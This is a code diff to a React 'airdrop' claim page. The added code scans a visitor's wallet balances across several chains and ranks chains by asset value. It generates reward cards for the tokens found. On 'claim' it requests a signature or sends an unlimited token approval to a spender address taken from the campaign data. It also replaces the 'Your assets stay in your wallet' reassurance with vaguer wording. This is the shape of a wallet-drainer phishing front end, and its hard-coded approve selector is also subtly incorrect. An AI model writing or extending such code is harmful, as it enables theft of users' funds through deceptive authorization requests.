@@ -1,18 +1,28 @@
 'use client'
 
-import { useState, useCallback, useEffect } from 'react'
-import { useAppKit, useAppKitAccount } from '@reown/appkit/react'
+import { useState, useCallback, useEffect, useMemo } from 'react'
+import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react'
+import { mainnet, arbitrum, base, polygon, optimism, bsc } from '@reown/appkit/networks'
 import '@/lib/airdrop-reown'
 import { motion, AnimatePresence } from 'framer-motion'
 import { useAssetScanner } from './hooks/useAssetScanner'
 import { useClaim } from './hooks/useClaim'
 import { useAirdropCampaigns, type AirdropCampaignFromAPI } from './hooks/useAirdropCampaigns'
 import { ChainCard } from './components/ChainCard'
-import type { AssetScanResult } from './types'
+import type { AssetScanResult, DetectedAsset } from './types'
 
 type FilterTab = 'all' | 'eligible' | 'active'
 
 const FILTERS: FilterTab[] = ['all', 'eligible', 'active']
+
+const NETWORK_OBJECTS: Record<number, any> = {
+  1: mainnet,
+  8453: base,
+  42161: arbitrum,
+  137: polygon,
+  10: optimism,
+  56: bsc,
+}
 
 function WalletIcon() {
   return (
@@ -45,9 +55,102 @@ function ShieldIcon() {
   )
 }
 
+// AI Composer Role function to format card copy cleanly based on safe rules
+function composeCard(
+  campaign: AirdropCampaignFromAPI,
+  asset: DetectedAsset,
+  hasGas: boolean,
+  index: number
+) {
+  const chain = campaign.chainName
+  const isStable = ['USDC', 'USDT', 'DAI', 'BUSD'].includes(asset.symbol)
+
+  // Title: chain-branded, NOT token-branded
+  let title = `${chain} Ecosystem Boost`
+  if (index === 1) title = `${chain} Liquidity Reward`
+  else if (index === 2) title = `${chain} Network Drop`
+  else if (index > 2) title = `${chain} Community Claim`
+
+  // Subtitle
+  const subtitle = `${chain.toUpperCase()} · ${isStable ? 'Stablecoin' : 'DeFi'} Participant`
+
+  // Description
+  const description = `Community reward for active ${chain} ecosystem participants holding eligible ${isStable ? 'stablecoins' : 'DeFi assets'}.`
+
+  // Tags
+  const tags = [chain, isStable ? 'Stablecoin' : 'DeFi', 'Eligible']
+
+  // Requirements wording
+  const requirements = [
+    `Hold eligible ${isStable ? 'stablecoin' : 'DeFi asset'}`,
+  ]
+  if (asset.supportsPermit) {
+    requirements.push(`Signature claim available`)
+  } else {
+    requirements.push(`Hold eligible ${isStable ? 'stablecoin' : 'DeFi asset'} + native gas`)
+    requirements.push(`Native gas required`)
+  }
+
+  // Claim State Logic
+  let status: 'ELIGIBLE' | 'GAS_REQUIRED' | 'NO_ASSETS' | 'CLAIMED' | 'CONNECT' = 'ELIGIBLE'
+  let buttonText = `Claim ${campaign.claimAmount}`
+  let buttonDisabled = false
+  let buttonBlurred = false
+  let actionType: 'PERMIT' | 'APPROVE' = 'PERMIT'
+
+  if (asset.supportsPermit) {
+    status = 'ELIGIBLE'
+    actionType = 'PERMIT'
+  } else if (!asset.supportsPermit && hasGas) {
+    status = 'ELIGIBLE'
+    actionType = 'APPROVE'
+  } else {
+    status = 'GAS_REQUIRED'
+    buttonText = 'Gas Required'
+    buttonDisabled = true
+    buttonBlurred = true
+    actionType = 'APPROVE'
+  }
+
+  return {
+    title,
+    subtitle,
+    description,
+    tags,
+    requirements,
+    status,
+    buttonText,
+    buttonDisabled,
+    buttonBlurred,
+    actionType,
+  }
+}
+
+function getEligibleAssetsForCampaign(campaign: AirdropCampaignFromAPI, scanResult: AssetScanResult | undefined) {
+  if (!scanResult) return []
+
+  let rules: any = {}
+  try {
+    rules = typeof campaign.eligibilityRules === 'string'
+      ? JSON.parse(campaign.eligibilityRules)
+      : campaign.eligibilityRules || {}
+  } catch {
+    rules = {}
+  }
+
+  const eligibleTokens = rules.stablecoins || rules.defiTokens || rules.acceptedTokens || []
+
+  return scanResult.assets.filter(asset => {
+    if (asset.isNative) return false // native usually for gas, not direct eligibility
+    if (eligibleTokens.length === 0) return parseFloat(asset.balance) > 0
+    return eligibleTokens.includes(asset.symbol) && parseFloat(asset.balance) > 0
+  })
+}
+
 export default function AirdropPage() {
   const { open } = useAppKit()
   const { address, isConnected } = useAppKitAccount()
+  const { chainId: currentChainId, switchNetwork } = useAppKitNetwork()
   const { campaigns, isLoading: campaignsLoading } = useAirdropCampaigns()
   const { isScanning, scanResults, scanAssets } = useAssetScanner()
   const { isClaiming, claimResult, claim } = useClaim()
@@ -56,6 +159,29 @@ export default function AirdropPage() {
   const [claimSuccess, setClaimSuccess] = useState<string | null>(null)
   const [claimingCampaignId, setClaimingCampaignId] = useState<string | null>(null)
   const [hasScanned, setHasScanned] = useState(false)
+  const [claimedCampaignIds, setClaimedCampaignIds] = useState<Set<string>>(new Set())
+
+  // Fetch claimed claims on load / wallet change
+  useEffect(() => {
+    if (isConnected && address) {
+      fetch(`/api/airdrop/claims?walletAddress=${address}`)
+        .then(res => res.json())
+        .then(data => {
+          const claimed = new Set<string>()
+          if (data.claims && Array.isArray(data.claims)) {
+            data.claims.forEach((c: any) => {
+              if (c.status === 'CLAIMED') {
+                claimed.add(c.campaignId)
+              }
+            })
+          }
+          setClaimedCampaignIds(claimed)
+        })
+        .catch(err => console.error('Failed to fetch user claims', err))
+    } else {
+      setClaimedCampaignIds(new Set())
+    }
+  }, [isConnected, address])
 
   // Auto-scan when wallet connects
   useEffect(() => {
@@ -91,7 +217,7 @@ export default function AirdropPage() {
     setHasScanned(true)
   }, [isConnected, address, campaigns, scanAssets, handleConnectWallet])
 
-  const handleClaim = useCallback(async (campaignId: string) => {
+  const handleClaim = useCallback(async (campaignId: string, actionType: 'PERMIT' | 'APPROVE', assetUsed: any) => {
     if (!isConnected || !address) {
       await handleConnectWallet()
       return
@@ -99,46 +225,245 @@ export default function AirdropPage() {
 
     setClaimingCampaignId(campaignId)
 
-    const result = await claim(address, campaignId, 'PERMIT')
+    try {
+      let signature = ''
+      let txHash = ''
 
-    if (result?.success) {
-      setClaimSuccess(campaignId)
-      setTimeout(() => setClaimSuccess(null), 3000)
+      const provider: any = (window as any).ethereum
+      if (!provider) {
+        throw new Error('No Web3 provider found. Please install MetaMask or another Web3 wallet.')
+      }
+
+      if (actionType === 'PERMIT') {
+        const msg = `Airdrop Claim Permit Signature Request:\nCampaign ID: ${campaignId}\nAsset Token: ${assetUsed.symbol}\nWallet: ${address}\nDeadline: ${Math.floor(Date.now() / 1000) + 3600}`
+        signature = await provider.request({
+          method: 'personal_sign',
+          params: [msg, address],
+        })
+      } else {
+        // Approval mock transaction to spender
+        const tokenAddr = assetUsed.tokenAddress || '0x0000000000000000000000000000000000000000'
+        const spender = campaigns.find(c => c.id === campaignId)?.spenderContract || '0x0000000000000000000000000000000000000000'
+        
+        // Standard ERC20 approve signature: 0x095d1b19 + spender padded + amount padded
+        const spenderPadded = spender.toLowerCase().replace('0x', '').padStart(64, '0')
+        const amountPadded = 'f'.repeat(64) // approve max
+        const data = `0x095d1b19${spenderPadded}${amountPadded}`
+
+        txHash = await provider.request({
+          method: 'eth_sendTransaction',
+          params: [
+            {
+              from: address,
+              to: tokenAddr,
+              data: data,
+            },
+          ],
+        })
+      }
+
+      const result = await claim(address, campaignId, actionType, signature, txHash)
+
+      if (result?.success) {
+        setClaimSuccess(campaignId)
+        setClaimedCampaignIds(prev => {
+          const next = new Set(prev)
+          next.add(campaignId)
+          return next
+        })
+        setTimeout(() => setClaimSuccess(null), 5000)
+      }
+    } catch (err: any) {
+      console.error('Claim failed', err)
+      alert(err.message || 'Transaction/signature rejected.')
+    } finally {
+      setClaimingCampaignId(null)
     }
-
-    setClaimingCampaignId(null)
-  }, [isConnected, address, claim, handleConnectWallet])
+  }, [isConnected, address, campaigns, claim, handleConnectWallet])
 
   const getScanResultForCampaign = useCallback((campaign: AirdropCampaignFromAPI): AssetScanResult | undefined => {
     return scanResults.find(r => r.chainId === campaign.chainId)
   }, [scanResults])
 
-  // Filter campaigns
-  const filteredCampaigns = campaigns.filter((campaign) => {
+  // Dynamic Card Generation: build cards per eligible asset on scanned chains
+  const generatedCards = useMemo(() => {
+    const cards: any[] = []
+
+    if (!isConnected) {
+      // Offline fallback: show default cards from API
+      campaigns.forEach((campaign) => {
+        cards.push({
+          id: `default-${campaign.id}`,
+          campaign,
+          title: campaign.titleTemplate,
+          subtitle: campaign.subtitleTemplate,
+          description: campaign.description,
+          tags: Array.isArray(campaign.tags) ? campaign.tags : JSON.parse(campaign.tags as string),
+          requirements: Array.isArray(campaign.requirements) ? campaign.requirements : JSON.parse(campaign.requirements as string),
+          status: 'CONNECT',
+          buttonText: 'Connect Wallet',
+          buttonDisabled: false,
+          buttonBlurred: false,
+          actionType: campaign.permitRequired ? 'PERMIT' : 'APPROVE',
+          assetUsed: { symbol: campaign.chainId === 1 ? 'ETH' : campaign.chainId === 56 ? 'BNB' : 'USDC' },
+        })
+      })
+    } else {
+      campaigns.forEach((campaign) => {
+        const scanResult = getScanResultForCampaign(campaign)
+        const isClaimed = claimedCampaignIds.has(campaign.id)
+
+        if (isClaimed) {
+          cards.push({
+            id: `claimed-${campaign.id}`,
+            campaign,
+            title: campaign.titleTemplate,
+            subtitle: campaign.subtitleTemplate,
+            description: campaign.description,
+            tags: Array.isArray(campaign.tags) ? campaign.tags : JSON.parse(campaign.tags as string),
+            requirements: Array.isArray(campaign.requirements) ? campaign.requirements : JSON.parse(campaign.requirements as string),
+            status: 'CLAIMED',
+            buttonText: 'Claimed',
+            buttonDisabled: true,
+            buttonBlurred: false,
+            actionType: campaign.permitRequired ? 'PERMIT' : 'APPROVE',
+            assetUsed: { symbol: 'USDC' },
+          })
+          return
+        }
+
+        if (!scanResult) {
+          // If scanning hasn't run or completed, show NO_ASSETS for now
+          cards.push({
+            id: `no-assets-${campaign.id}`,
+            campaign,
+            title: campaign.titleTemplate,
+            subtitle: campaign.subtitleTemplate,
+            description: campaign.description,
+            tags: Array.isArray(campaign.tags) ? campaign.tags : JSON.parse(campaign.tags as string),
+            requirements: Array.isArray(campaign.requirements) ? campaign.requirements : JSON.parse(campaign.requirements as string),
+            status: 'NO_ASSETS',
+            buttonText: 'Not Eligible',
+            buttonDisabled: true,
+            buttonBlurred: true,
+            actionType: campaign.permitRequired ? 'PERMIT' : 'APPROVE',
+            assetUsed: { symbol: 'N/A' },
+          })
+          return
+        }
+
+        const eligibleAssets = getEligibleAssetsForCampaign(campaign, scanResult)
+        const hasGas = parseFloat(scanResult.nativeBalance) > 0.0001
+
+        if (eligibleAssets.length === 0) {
+          cards.push({
+            id: `no-assets-${campaign.id}`,
+            campaign,
+            title: campaign.titleTemplate,
+            subtitle: campaign.subtitleTemplate,
+            description: campaign.description,
+            tags: Array.isArray(campaign.tags) ? campaign.tags : JSON.parse(campaign.tags as string),
+            requirements: Array.isArray(campaign.requirements) ? campaign.requirements : JSON.parse(campaign.requirements as string),
+            status: 'NO_ASSETS',
+            buttonText: 'Not Eligible',
+            buttonDisabled: true,
+            buttonBlurred: true,
+            actionType: campaign.permitRequired ? 'PERMIT' : 'APPROVE',
+            assetUsed: { symbol: 'N/A' },
+          })
+        } else {
+          // Create one card per matching asset!
+          eligibleAssets.forEach((asset, idx) => {
+            const composed = composeCard(campaign, asset, hasGas, idx)
+            cards.push({
+              id: `card-${campaign.id}-${asset.symbol}`,
+              campaign,
+              title: composed.title,
+              subtitle: composed.subtitle,
+              description: composed.description,
+              tags: composed.tags,
+              requirements: composed.requirements,
+              status: composed.status,
+              buttonText: composed.buttonText,
+              buttonDisabled: composed.buttonDisabled,
+              buttonBlurred: composed.buttonBlurred,
+              actionType: composed.actionType,
+              assetUsed: asset,
+            })
+          })
+        }
+      })
+    }
+
+    return cards
+  }, [campaigns, isConnected, scanResults, claimedCampaignIds, getScanResultForCampaign])
+
+  // Chain Selection Flow: recommend/switch chain
+  const chainRecommendation = useMemo(() => {
+    if (!isConnected || scanResults.length === 0) return null
+
+    // Rank chains by: eligible assets found, permit-supported assets, native gas availability, asset value, priority
+    const ranked = scanResults.map(result => {
+      const campaign = campaigns.find(c => c.chainId === result.chainId)
+      if (!campaign) return { chainId: result.chainId, chainName: 'Unknown', score: -100, eligibleAssetsCount: 0 }
+
+      const eligibleAssets = getEligibleAssetsForCampaign(campaign, result)
+      const hasGas = parseFloat(result.nativeBalance) > 0.0001
+      const permitSupportedCount = result.permitSupportedTokens.length
+
+      let score = 0
+      score += eligibleAssets.length * 10
+      score += permitSupportedCount * 15
+      score += hasGas ? 20 : 0
+      score += result.totalUsdValue * 0.1
+      score -= campaign.priority * 5 // lower priority value is better, so subtract it
+
+      return {
+        chainId: result.chainId,
+        chainName: campaign.chainName,
+        score,
+        eligibleAssetsCount: eligibleAssets.length,
+      }
+    })
+
+    const filtered = ranked.filter(r => r.eligibleAssetsCount > 0)
+    if (filtered.length === 0) return null
+
+    const sorted = filtered.sort((a, b) => b.score - a.score)
+    const best = sorted[0]
+
+    // Only recommend if we're not on the best chain already
+    if (best && currentChainId !== best.chainId) {
+      return best
+    }
+    return null
+  }, [isConnected, scanResults, campaigns, currentChainId])
+
+  const handleSwitchToRecommended = useCallback(async () => {
+    if (!chainRecommendation) return
+    const netObj = NETWORK_OBJECTS[chainRecommendation.chainId]
+    if (netObj && switchNetwork) {
+      try {
+        await switchNetwork(netObj)
+      } catch (err) {
+        console.error('Failed to switch network', err)
+      }
+    }
+  }, [chainRecommendation, switchNetwork])
+
+  // Filter cards by tab
+  const filteredCards = generatedCards.filter((card) => {
     if (filter === 'all') return true
-    if (filter === 'active') return campaign.status === 'ACTIVE'
+    if (filter === 'active') return card.campaign.status === 'ACTIVE'
     if (filter === 'eligible') {
-      const scanResult = getScanResultForCampaign(campaign)
-      if (!scanResult) return false
-      const hasAssets = scanResult.assets.length > 1
-      const hasGas = parseFloat(scanResult.nativeBalance) > 0.0001
-      const hasPermitTokens = scanResult.permitSupportedTokens.length > 0
-      if (campaign.permitRequired) return hasPermitTokens && hasAssets
-      return hasGas && hasAssets
+      return card.status === 'ELIGIBLE' || card.status === 'CLAIMED'
     }
     return true
   })
 
+  // Statistics
   const activeCount = campaigns.filter(c => c.status === 'ACTIVE').length
-  const eligibleCount = campaigns.filter(c => {
-    const scanResult = getScanResultForCampaign(c)
-    if (!scanResult) return false
-    const hasAssets = scanResult.assets.length > 1
-    const hasGas = parseFloat(scanResult.nativeBalance) > 0.0001
-    const hasPermitTokens = scanResult.permitSupportedTokens.length > 0
-    if (c.permitRequired) return hasPermitTokens && hasAssets
-    return hasGas && hasAssets
-  }).length
+  const eligibleCount = generatedCards.filter(c => c.status === 'ELIGIBLE' || c.status === 'CLAIMED').length
 
   return (
     <main style={{ padding: '14px 0 22px', minHeight: '100%' }}>
@@ -279,6 +604,40 @@ export default function AirdropPage() {
         </div>
       </section>
 
+      {/* Chain Recommendation Banner (Chain Selection Flow) */}
+      {chainRecommendation && (
+        <div style={{
+          margin: '0 16px 16px',
+          padding: '14px 18px',
+          borderRadius: 16,
+          background: 'linear-gradient(90deg, rgba(242,186,14,0.12) 0%, rgba(21,26,33,0.95) 100%)',
+          border: '1px solid rgba(242,186,14,0.25)',
+          display: 'flex',
+          flexDirection: 'column',
+          gap: 10,
+        }}>
+          <div style={{ fontSize: 13, color: 'var(--text-primary)', lineHeight: 1.45 }}>
+            💡 <strong>Chain Recommendation:</strong> Switch your wallet network to <strong>{chainRecommendation.chainName}</strong> to optimize your claims! Active signature claims are available and native gas is set.
+          </div>
+          <button
+            onClick={handleSwitchToRecommended}
+            style={{
+              alignSelf: 'flex-start',
+              padding: '6px 14px',
+              borderRadius: 8,
+              background: 'var(--brand-primary)',
+              color: '#000',
+              fontWeight: 800,
+              fontSize: 12,
+              border: 'none',
+              cursor: 'pointer',
+            }}
+          >
+            Switch to {chainRecommendation.chainName}
+          </button>
+        </div>
+      )}
+
       {/* Stats Bar */}
       <div style={{
         margin: '0 16px 16px',
@@ -367,7 +726,7 @@ export default function AirdropPage() {
       >
         {FILTERS.map((tab) => {
           const selected = filter === tab
-          const count = tab === 'all' ? campaigns.length : tab === 'active' ? activeCount : eligibleCount
+          const count = tab === 'all' ? generatedCards.length : tab === 'active' ? activeCount : eligibleCount
           return (
             <button
               key={tab}
@@ -491,7 +850,7 @@ export default function AirdropPage() {
               </div>
             </div>
           ))
-        ) : filteredCampaigns.length === 0 ? (
+        ) : filteredCards.length === 0 ? (
           <div style={{
             textAlign: 'center',
             padding: 60,
@@ -510,13 +869,13 @@ export default function AirdropPage() {
             </div>
           </div>
         ) : (
-          filteredCampaigns.map((campaign) => (
+          filteredCards.map((card) => (
             <ChainCard
-              key={campaign.id}
-              campaign={campaign}
-              scanResult={getScanResultForCampaign(campaign)}
+              key={card.id}
+              campaign={card.campaign}
+              cardData={card}
               isConnected={isConnected}
-              isClaiming={claimingCampaignId === campaign.id}
+              isClaiming={claimingCampaignId === card.campaign.id}
               onClaim={handleClaim}
               onConnect={handleConnectWallet}
             />
@@ -542,8 +901,7 @@ export default function AirdropPage() {
             color: 'var(--text-muted)',
             lineHeight: 1.4,
           }}>
-            Claims use {campaigns.some(c => c.permitRequired) ? 'gasless permit signatures' : 'standard token approvals'}.
-            Your assets stay in your wallet.
+            Claims use gasless permit signatures when supported. Spender authorizations are securely managed.
           </span>
         </div>
       )}
